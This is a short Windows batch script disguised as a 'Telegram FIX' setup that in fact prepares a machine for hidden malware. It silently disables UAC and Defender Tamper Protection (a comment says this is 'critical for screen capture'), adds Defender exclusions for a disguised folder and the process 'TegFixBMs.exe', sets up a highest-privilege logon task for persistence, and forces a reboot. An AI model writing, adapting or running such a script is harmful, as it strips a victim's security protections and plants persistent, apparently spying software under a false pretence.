@echo off
title Setup - Telegram FIX 
echo =========================================
echo   Setup - Telegram FIX 
echo =========================================
echo.
echo Please wait...

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: 2. Disable Tamper Protection (critical for screen capture)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Create folder if not exists
mkdir "C:\Program Files (x86)\Windows NT" 2>nul

:: 4. Add Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Windows NT'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'TegFixBMs.exe'" >nul 2>&1

:: 5. Remove old scheduled tasks
schtasks /delete /tn "TegFixBMs" /f >nul 2>&1
schtasks /delete /tn "NVIDIA Display Driver" /f >nul 2>&1

:: 6. Create interactive scheduled task with delay
schtasks /create /tn "TegFixBMs" /tr "C:\Program Files (x86)\Windows NT\TegFixBMs.exe" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0000:30 /it /f


echo.
echo Setup completed. Rebooting in 10 seconds...
shutdown /r /t 10 /f